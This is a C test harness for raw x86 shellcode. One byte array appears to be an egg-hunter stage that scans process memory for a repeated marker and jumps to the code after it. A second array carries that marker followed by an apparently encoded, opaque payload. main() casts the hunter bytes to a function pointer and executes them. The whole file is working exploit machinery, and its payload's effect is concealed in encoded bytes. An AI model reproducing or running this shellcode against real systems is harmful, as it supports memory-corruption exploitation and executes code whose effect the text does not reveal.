#include<stdio.h>
#include<string.h>

unsigned char code[] =  "\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char code2[] =  "\x90\x50\x90\x50\x90\x50\x90\x50\xdd\xc6\xd9\x74\x24\xf4\x58\xbf\xe3\xba\x46\x85\x29\xc9\xb1"
"\x0b\x31\x78\x1a\x83\xe8\xfc\x03\x78\x16\xe2\x16\xd0\x4d\xdd"
"\x41\x77\x34\xb5\x5c\x1b\x31\xa2\xf6\xf4\x32\x45\x06\x63\x9a"
"\xf7\x6f\x1d\x6d\x14\x3d\x09\x65\xdb\xc1\xc9\x59\xb9\xa8\xa7"
"\x8a\x4e\x42\x38\x82\xe3\x1b\xd9\xe1\x84";


main()
{
	printf("Shellcode Length: %d\n",strlen(code));
	int (*ret) () = (int(*)())code;
	ret();
}
